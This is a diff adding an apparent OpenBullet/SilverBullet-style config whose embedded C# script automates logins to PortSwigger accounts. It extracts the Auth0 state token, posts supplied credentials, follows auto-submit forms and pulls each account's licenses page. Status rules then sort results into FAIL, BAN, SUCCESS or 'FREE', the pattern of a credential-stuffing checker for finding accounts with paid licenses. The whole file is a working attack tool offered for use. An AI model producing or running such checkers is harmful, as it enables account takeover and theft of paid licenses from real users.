@@ -1,0 +1,182 @@
+BEGIN SCRIPT CSharp StartMethod="Main" ClassName="PortSwiggerAuth" NameSpace="SB" IsStatic=True "USER" "PASS"
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Collections.Generic;
+using System.Text.RegularExpressions;
+using System.Linq;
+
+namespace SB {
+    public class PortSwiggerAuth {
+
+        private static void UpdateCookies(HttpResponseMessage response, Dictionary<string, string> cookies) {
+            if (response?.Headers != null && response.Headers.TryGetValues("Set-Cookie", out var setCookies)) {
+                foreach (var c in setCookies) {
+                    var parts = c.Split(';')[0].Split(new[] { '=' }, 2);
+                    if (parts.Length == 2) {
+                        cookies[parts[0]] = parts[1];
+                    }
+                }
+            }
+        }
+
+        private static string GetCookieString(Dictionary<string, string> cookies) {
+            if (cookies == null || cookies.Count == 0) return string.Empty;
+            return string.Join("; ", cookies.Select(kv => kv.Key + "=" + kv.Value));
+        }
+
+        private static HttpResponseMessage DoRequest(HttpClient client, HttpMethod method, string url, Dictionary<string, string> cookies, HttpContent content = null) {
+            if (string.IsNullOrEmpty(url)) return null;
+
+            var req = new HttpRequestMessage(method, url);
+            if (content != null) req.Content = content;
+
+            var cookieStr = GetCookieString(cookies);
+            if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+            var res = client.SendAsync(req).GetAwaiter().GetResult();
+            if (res == null) return null;
+
+            UpdateCookies(res, cookies);
+
+            int redirects = 0;
+            while (res != null && (int)res.StatusCode >= 300 && (int)res.StatusCode <= 399 && redirects < 15) {
+                string location = null;
+                if (res.Headers?.Location != null) {
+                    location = res.Headers.Location.ToString();
+                } else if (res.Headers != null && res.Headers.TryGetValues("Location", out var locVals)) {
+                    location = locVals.FirstOrDefault();
+                }
+
+                if (string.IsNullOrEmpty(location)) break;
+
+                if (location.StartsWith("/")) {
+                    var uri = new Uri(url);
+                    location = uri.Scheme + "://" + uri.Host + location;
+                }
+                url = location;
+
+                req = new HttpRequestMessage(HttpMethod.Get, url);
+                cookieStr = GetCookieString(cookies);
+                if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+                res = client.SendAsync(req).GetAwaiter().GetResult();
+                if (res != null) UpdateCookies(res, cookies);
+                redirects++;
+            }
+            return res;
+        }
+
+        public static string Main(string email, string pass) {
+            try {
+                if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(pass)) return "FAILED_LOGIN";
+
+                var handler = new HttpClientHandler {
+                    UseCookies = false,
+                    AllowAutoRedirect = false
+                };
+
+                using (var client = new HttpClient(handler)) {
+                    client.Timeout = TimeSpan.FromSeconds(30);
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+
+                    var cookies = new Dictionary<string, string>();
+
+                    // GET login page (correct endpoint)
+                    var res1 = DoRequest(client, HttpMethod.Get, "https://login.portswigger.net/u/login", cookies);
+                    if (res1 == null) return "ERROR_HTTP_NULL";
+
+                    var body1 = res1.Content != null ? res1.Content.ReadAsStringAsync().GetAwaiter().GetResult() : "";
+                    string currentUrl = res1.RequestMessage?.RequestUri?.ToString() ?? "https://login.portswigger.net/u/login";
+
+                    // Extract state parameter
+                    var stateMatch = Regex.Match(body1, "name=\"state\" value=\"([^\"]+)\"");
+                    if (!stateMatch.Success) return "FAILED_AT_STATE";
+
+                    // POST credentials with state
+                    var postData = new FormUrlEncodedContent(new[] {
+                        new KeyValuePair<string, string>("state", stateMatch.Groups[1].Value),
+                        new KeyValuePair<string, string>("username", email),
+                        new KeyValuePair<string, string>("password", pass),
+                        new KeyValuePair<string, string>("action", "default")
+                    });
+
+                    var res2 = DoRequest(client, HttpMethod.Post, currentUrl, cookies, postData);
+                    if (res2 == null) return "ERROR_HTTP_NULL";
+
+                    var body2 = res2.Content != null ? res2.Content.ReadAsStringAsync().GetAwaiter().GetResult() : "";
+                    currentUrl = res2.RequestMessage?.RequestUri?.ToString() ?? currentUrl;
+
+                    // Check for login failure - better detection
+                    if (body2.Contains("Wrong email or password") ||
+                        body2.Contains("Invalid email or password") ||
+                        body2.Contains("login") && body2.Contains("Log in to PortSwigger")) {
+                        return "FAILED_LOGIN";
+                    }
+
+                    // Handle automatic form submission loops (Auth0)
+                    int loopCounter = 0;
+                    while (body2.Contains("document.forms[0].submit()")) {
+                        if (loopCounter >= 3) return "INFINITE_LOOP_DETECTED";
+                        loopCounter++;
+
+                        var actionMatch = Regex.Match(body2, "action=\"([^\"]+)\"");
+                        if (!actionMatch.Success) break;
+
+                        string actionUrl = WebUtility.HtmlDecode(actionMatch.Groups[1].Value);
+                        if (actionUrl.StartsWith("/")) {
+                            var uri = new Uri(currentUrl);
+                            actionUrl = uri.Scheme + "://" + uri.Host + actionUrl;
+                        }
+
+                        var inputs = Regex.Matches(body2, "<input type=\"hidden\" name=\"([^\"]+)\" value=\"([^\"]*)\"");
+                        var formDict = new List<KeyValuePair<string, string>>();
+                        foreach (Match m in inputs) {
+                            string val = WebUtility.HtmlDecode(m.Groups[2].Value) ?? "";
+                            formDict.Add(new KeyValuePair<string, string>(m.Groups[1].Value, val));
+                        }
+
+                        var formContent = new FormUrlEncodedContent(formDict);
+                        res2 = DoRequest(client, HttpMethod.Post, actionUrl, cookies, formContent);
+                        if (res2 == null) break;
+
+                        body2 = res2.Content != null ? res2.Content.ReadAsStringAsync().GetAwaiter().GetResult() : "";
+                        currentUrl = res2.RequestMessage?.RequestUri?.ToString() ?? currentUrl;
+                    }
+
+                    // Check if still on login page
+                    if (currentUrl.Contains("/u/login") && body2.Contains("name=\"state\"")) {
+                        return "FAILED_LOGIN";
+                    }
+
+                    // GET licenses page
+                    var res3 = DoRequest(client, HttpMethod.Get, "https://portswigger.net/users/youraccount/licenses", cookies);
+                    if (res3 == null) return "ERROR_HTTP_NULL";
+
+                    return res3.Content != null ? res3.Content.ReadAsStringAsync().GetAwaiter().GetResult() : "";
+                }
+            } catch (Exception ex) {
+                return "EX: " + ex.ToString();
+            }
+        }
+    }
+}
+END SCRIPT -> VARS "result"
+
+IF "<result>" Contains "FAILED_LOGIN"
+  SET STATUS FAIL
+ELIF "<result>" Contains "FAILED_AT_STATE"
+  SET STATUS BAN
+ELIF "<result>" Contains "EX: "
+  PRINT "<result>"
+  SET STATUS BAN
+ELIF "<result>" Contains "ERROR_HTTP_NULL"
+  SET STATUS BAN
+ELIF "<result>" Contains "INFINITE_LOOP_DETECTED"
+  SET STATUS BAN
+ELIF "<result>" Contains "You do not have any subscriptions"
+  SET STATUS CUSTOM "FREE"
+ELSE
+  SET STATUS SUCCESS
+ENDIF
